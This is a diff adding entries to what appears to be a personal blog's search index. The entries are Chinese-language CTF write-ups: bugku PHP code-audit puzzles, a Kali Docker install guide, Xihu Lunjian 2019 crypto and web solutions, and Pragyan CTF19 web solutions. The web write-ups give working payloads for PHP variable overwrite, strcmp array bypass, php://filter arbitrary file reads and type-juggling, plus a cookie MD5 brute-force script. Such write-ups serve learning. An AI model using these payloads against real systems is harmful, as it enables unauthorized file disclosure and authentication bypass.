@@ -1,6 +1,37 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[简单的代码审计]]></title>
+    <url>%2F2019%2F04%2F25%2F%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
+    <content type="text"><![CDATA[#bugku里一些简单的代码审计题 extract变量覆盖1234567891011121314151617&lt;?php$flag='xxx';extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; 首先extract函数用来将变量从数组中导入到当前的符号表中。这里要让$shiyan==$content,那么只要给$flag和$shiyan变量同时传入空值即可。 12payload:shiyan=&amp;flag= strcmp比较字符串1234567891011 &lt;?php $flag = "flag&#123;xxxxx&#125;"; if (isset($_GET['a'])) &#123; if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die('Flag: '.$flag); else print 'No'; &#125;?&gt; 在5.3之前的php中,strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制. 1payload:a[]=1]]></content>
+      <categories>
+        <category>web安全学习笔记</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[kali安装docker]]></title>
+    <url>%2F2019%2F04%2F19%2Fkali%E5%AE%89%E8%A3%85docker%2F</url>
+    <content type="text"><![CDATA[第一步123456apt-get updateapt-get install -y apt-transport-https ca-certificatesapt-get install dirmngr 第二步123456apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609Decho 'deb https://apt.dockerproject.org/repo debian-stretch main' &gt; /etc/apt/sources.list.d/docker.list 第三步1234apt-get updateapt-get install docker-engine]]></content>
+      <categories>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[西湖论剑2019]]></title>
+    <url>%2F2019%2F04%2F07%2F%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019%2F</url>
+    <content type="text"><![CDATA[#CRYPTO哈夫曼之谜123456789101111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110a:4d:9g:1f:5l:10:75:9&#123;:1&#125;:1 123456import huffmanimport collectionst1=huffman.codebook([('a', 4), ('d', 9), ('g', 1), ('f', 5),('l', 1),('0', 7),('5', 9),('&#123;', 1),('&#125;', 1)])print(t1)#&#123;'a': '000', 'd': '10', 'g': '00100', 'f': '110', 'l': '00101', '0': '111', '5': '01', '&#123;': '00111', '&#125;': '00110'&#125;#得到f&#123;algddf5dfd0f05550500a5af55dd0d5d0ad&#125;，权重一样的位置可以交换，最后提交ddf5dfd0f05550500a5af55dd0d5d0ad成功 #babyt3http://ctf1.linkedbyx.com:10300首页发现是任意文件读取，然后又看到hint，base64解码得到dir.php,然后用php伪协议读取dir.php，再base64解码payload:1http://ctf1.linkedbyx.com:10300/?file=php://filter/read=convert.base64-encode/resource=dir.php 得到源码123456&lt;?php$a = @$_GET['dir'];if(!$a)&#123;$a = '/tmp';&#125;var_dump(scandir($a)); scandir() 函数返回指定目录中的文件和目录的数组,再同级和上级目录都试试，发现上级目录是存在文件的payload：1http://ctf1.linkedbyx.com:10300/dir.php?dir=/.. 返回目录信息1array(25) &#123; [0]=&gt; string(1) "." [1]=&gt; string(2) ".." [2]=&gt; string(10) ".dockerenv" [3]=&gt; string(3) "bin" [4]=&gt; string(4) "boot" [5]=&gt; string(3) "dev" [6]=&gt; string(3) "etc" [7]=&gt; string(16) "ffffflag_1s_Her4" [8]=&gt; string(4) "home" [9]=&gt; string(3) "lib" [10]=&gt; string(5) "lib64" [11]=&gt; string(5) "media" [12]=&gt; string(3) "mnt" [13]=&gt; string(7) "my_init" [14]=&gt; string(10) "my_service" [15]=&gt; string(3) "opt" [16]=&gt; string(4) "proc" [17]=&gt; string(4) "root" [18]=&gt; string(3) "run" [19]=&gt; string(4) "sbin" [20]=&gt; string(3) "srv" [21]=&gt; string(3) "sys" [22]=&gt; string(3) "tmp" [23]=&gt; string(3) "usr" [24]=&gt; string(3) "var" &#125; 发现ffffflag_1s_Her4，再读取就好了，得到flagpayload：1http://ctf1.linkedbyx.com:10300/?file=/ffffflag_1s_Her4]]></content>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Pragyan CTF19 webwp]]></title>
     <url>%2F2019%2F03%2F10%2FPragyan-CTF19-webwp%2F</url>
     <content type="text"><![CDATA[Cookie Monster 100Do prepare to see cookies lurking everywhere. http://159.89.166.12:13500/12345678910111213141516171819202122import requestsimport hashlibfrom itertools import *import stringflag = []wordlist = string.printables = requests.session()for i in range(40): cookie = s.get('http://159.89.166.12:13500/').cookies['flag'] flag.append(cookie)print (flag)result= []for i in flag: for j in permutations(wordlist,2): guess = "".join(j) md5 = hashlib.md5(guess.encode("utf8")).hexdigest() if md5 ==i: result.append(guess) breakprint (result) Game of Faces 100The Game of Faces, welcomes you. In this era, where AIs generate a lot of faces, we would like you to contribute to the same by uploading your image. Thank you for contributing, to continue. http://159.89.166.12:15000/12把css删掉，发现一个假的提交，得到一个base64，解码得The_scroll_says=the_night_kingVSvalyrian.txt，然后直接访问。。。http://159.89.166.12:15000/the_night_kingVSvalyrian.txt Mandatory PHP 125PHP, PHP everywhere get the flag and earn your points there. http://159.89.166.12:14000/ 12345678910111213141516171819202122232425262728293031&lt;?php include 'flag.php'; highlight_file('index.php'); $a = $_GET["val1"]; $b = $_GET["val2"]; $c = $_GET["val3"]; $d = $_GET["val4"]; if(preg_match('/[^A-Za-z]/', $a)) die('oh my gawd...'); $a=hash("sha256",$a); $a=(log10($a**(0.5)))**2; //传入 $a='pp';会发现 float(INF) phpif($c&gt;0&amp;&amp;$d&gt;0&amp;&amp;$d&gt;$c&amp;&amp;$a==$c*$c+$d*$d) //这里也传入无限大$s1="true"; else die("Bye..."); if($s1==="true") echo $flag1; for($i=1;$i&lt;=10;$i++)&#123; if($b==urldecode($b)) //编码11次 die('duck'); else $b=urldecode($b); &#125; if($b==="WoAHh!") $s2="true"; else die('oops..'); if($s2==="true") echo $flag2; die('end...'); ?&gt; payload: http://159.89.166.12:14000/?val1=pp&amp;val2=WoAHh%2525252525252525252521&amp;val3=1&amp;val4=100000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000]]></content>
